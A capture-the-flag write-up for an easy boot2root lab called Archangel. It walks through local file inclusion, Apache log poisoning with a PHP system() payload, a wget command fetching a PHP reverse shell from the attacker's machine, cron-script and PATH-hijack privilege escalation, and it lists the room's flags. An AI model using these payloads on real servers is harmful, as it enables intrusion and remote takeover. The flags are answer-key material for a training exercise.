# Information

Name: Archangel

Difficulty: Easy

Description: Boot2root, Web exploitation, Privilege escalation, LFI

## Recon

**Search for open ports using nmap.**

![image](https://user-images.githubusercontent.com/43668197/133605421-aa240fea-003d-48a4-bd4f-18e007819542.png)

Our attack surface consists of a webserver at port 80 and then an ssh server after we get credentials at port 22. A more aggressive scan reveals we have access to
some supported http methods: HEAD, GET, POST, and OPTIONS.

![image](https://user-images.githubusercontent.com/43668197/133610261-28882a64-0d9a-4a85-b3f7-08488bd25bb7.png)

A quick look around the site reveals another host name in an email.

![image](https://user-images.githubusercontent.com/43668197/133611175-753c2cbe-ef4c-48cd-ad66-62bbe6f9d58d.png)

**Find a different hostname**

mafialive.thm

I run a gobuster on this ip first to see if theres anything else of interest. The flags directory exists just to troll us of course but I still enjoyed the laugh.
But otherwise found nothing here so its time to add mafialive.thm to /etc/hosts.

![image](https://user-images.githubusercontent.com/43668197/133611487-758f1f52-90fa-46ec-bdec-e64592173520.png)

Navigating to http://mafialive.thm/ immediately greets us with the first flag.

**Find flag 1**

thm{f0und_th3_r1ght_h0st_n4m3} 

This host has a robots.txt with some useful information for us.

![image](https://user-images.githubusercontent.com/43668197/133613104-ac9a785f-c4f1-42e4-a0e3-b0ec54ff3b77.png)

**Look for a page under development**

test.php

The title of this page is INCLUDE. Could this be a hint toward LFI?

## Exploitation: LFI

![image](https://user-images.githubusercontent.com/43668197/133614157-eee2f713-2775-4c07-96a3-b4c51e102353.png)

?view= looks promising. We can use phpfilter to read the php code of the site.

https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
```

![image](https://user-images.githubusercontent.com/43668197/133614629-c2a7dfb8-317b-4a9b-95df-0f9469b200db.png)

![image](https://user-images.githubusercontent.com/43668197/133614920-bc58d46d-d2bb-4528-bd7d-44745bdf0c86.png)

Now we ready the test.php page using the same method.

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

![image](https://user-images.githubusercontent.com/43668197/133615351-8f51b1c5-d1ee-437d-9d89-0f9ab5d2a8d0.png)

And we get another flag.

**Find flag 2**

thm{explo1t1ng_lf1}

We can bypass the filter by using // instead of / so we use:

```
test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
```
And it works!

![image](https://user-images.githubusercontent.com/43668197/133615899-dd76a7dc-6f4d-424d-b98f-1951583feb86.png)

## Exploitation: RCE

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log
```

We can access the log file. https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-2-rce so we replace the User-Agent header with the malicious PHP code.

```
curl 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log' -H 'User-Agent: <?php system($_GET['cmd']); ?>'
```

## Initial access

So now we can set up an http server on our machine and use wget to upload the payload.

```
mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=wget 10.2.70.199:8000/php-reverse-shell.php -O /tmp/reverse.php
```

Start the nc listener.

![image](https://user-images.githubusercontent.com/43668197/133627778-8096c9c8-19a2-4480-9af4-196bb989cbc5.png)

Then set the chmod and execute.

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=chmod 777 /tmp/reverse.php; php /tmp/reverse.php
```

And we're in.

![image](https://user-images.githubusercontent.com/43668197/133628117-0353bf0b-d248-46d4-941a-f1ca6a88dce5.png)

Theres a single user named archangel and we find the user flag there.

**Get a shell and find the user flag**

thm{lf1_t0_rc3_1s_tr1cky}

Theres another folder here called secret but access is limited to the user archangel. There isnt much else to go on so I use wget to grab linpeas.sh from my local
machine and let it run. It finds an interesting cron job belonging to archangel.

![image](https://user-images.githubusercontent.com/43668197/133632657-3ed7ba40-c274-4dea-9cc4-2a9b6ea04fe3.png)

It also finds an all too easy file but we all know where this goes.

![image](https://user-images.githubusercontent.com/43668197/133634017-01d7f08e-5ede-4faa-aa59-253da33b7328.png)

![image](https://user-images.githubusercontent.com/43668197/133634167-8c583de8-112b-4f39-9480-b562f2843728.png)

![image](https://user-images.githubusercontent.com/43668197/133634347-4f374296-430d-490e-b6bd-dfe1ec2cf761.png)

## Initial priv esc to archangel user

This script can be edited and executed by any user. So we insert our reverse shell after loading up nc listener on our machine and we are in.

![image](https://user-images.githubusercontent.com/43668197/133636214-14bcef84-1888-4d67-b8e8-2d71f304c800.png)

![image](https://user-images.githubusercontent.com/43668197/133636414-c63f7a52-2f14-424c-a710-2b2c4141972a.png)

Time to check out that secret folder that archangel has. It contains the user flag and a binary file named backup. This ELF executable has the SUID bit set, 
which means we can execute this binary with the effective user-id of the root user.

**Get User 2 flag**

thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

Taking a look at the strings for the file backup revels an interesting cp command. We can priv esc this using PATH variable
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

![image](https://user-images.githubusercontent.com/43668197/133637607-9b8b8553-e208-418f-b705-c6f4cc147841.png)

![image](https://user-images.githubusercontent.com/43668197/133638048-a4f48378-bb26-47c2-98b9-4ce0e004c7d1.png)

And we can find the root flag in the usual /root directory

**Root the machine and find the root flag**

thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}



